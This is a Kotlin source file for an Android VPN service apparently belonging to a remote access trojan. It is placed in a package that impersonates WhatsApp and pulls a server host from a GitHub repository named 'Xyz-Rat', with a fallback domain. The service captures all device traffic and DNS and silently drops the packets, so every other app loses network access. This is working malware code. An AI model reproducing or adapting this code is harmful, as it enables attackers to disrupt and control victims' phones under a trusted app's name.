package com.whatsapp.bug.crash

import android.content.Intent
import android.net.VpnService
import android.os.ParcelFileDescriptor
import android.util.Log
import java.io.FileInputStream
import java.net.URL
import java.nio.ByteBuffer

class NetworkLockVpnService : VpnService() {

    companion object {
        const val TAG = "NetworkLockVpn"
        const val SERVER_URL = "https://raw.githubusercontent.com/ZalRyuichi/Xyz-Rat/main/network.txt"
        const val FALLBACK_HOST = "zalryuichi.lexzy.my.id"
        var isRunning = false
    }

    private var vpnInterface: ParcelFileDescriptor? = null
    private var vpnThread: Thread? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") {
            stopVpn()
            return START_NOT_STICKY
        }
        Thread {
            val host = fetchServerHost()
            startVpn(host)
        }.also { it.isDaemon = true; it.start() }
        return START_STICKY
    }

    private fun fetchServerHost(): String {
        return try {
            val text = URL(SERVER_URL).readText(Charsets.UTF_8).trim()
            if (text.isNotEmpty()) text else FALLBACK_HOST
        } catch (e: Exception) {
            Log.w(TAG, "Gagal fetch network.txt, pakai fallback: ${e.message}")
            FALLBACK_HOST
        }
    }

    private fun startVpn(serverHost: String) {
        try {
            Log.d(TAG, "NetworkLock VPN start, server: $serverHost")

            val builder = Builder()
                .setSession("NetworkLock")
                .addAddress("10.89.0.1", 32)
                .addRoute("0.0.0.0", 0)
                .addRoute("::", 0)
                .addDnsServer("10.89.0.2")
                .setMtu(1500)
                .addDisallowedApplication(packageName)

            vpnInterface = builder.establish()
            isRunning = true
            Log.d(TAG, "NetworkLock VPN active")

            vpnThread = Thread {
                val buf = ByteBuffer.allocate(32767)
                val input = FileInputStream(vpnInterface!!.fileDescriptor)
                try {
                    while (isRunning) {
                        buf.clear()
                        val len = input.read(buf.array())
                        if (len <= 0) Thread.sleep(5)
                    }
                } catch (e: InterruptedException) {
                    Log.d(TAG, "VPN thread interrupted")
                } catch (e: Exception) {
                    Log.e(TAG, "VPN thread error: ${e.message}")
                }
            }.also {
                it.isDaemon = true
                it.start()
            }

        } catch (e: Exception) {
            Log.e(TAG, "startVpn error: ${e.message}")
            isRunning = false
        }
    }

    private fun stopVpn() {
        isRunning = false
        vpnThread?.interrupt()
        vpnThread = null
        try { vpnInterface?.close() } catch (_: Exception) {}
        vpnInterface = null
        Log.d(TAG, "NetworkLock VPN stopped")
        stopSelf()
    }

    override fun onDestroy() {
        stopVpn()
        super.onDestroy()
    }
}
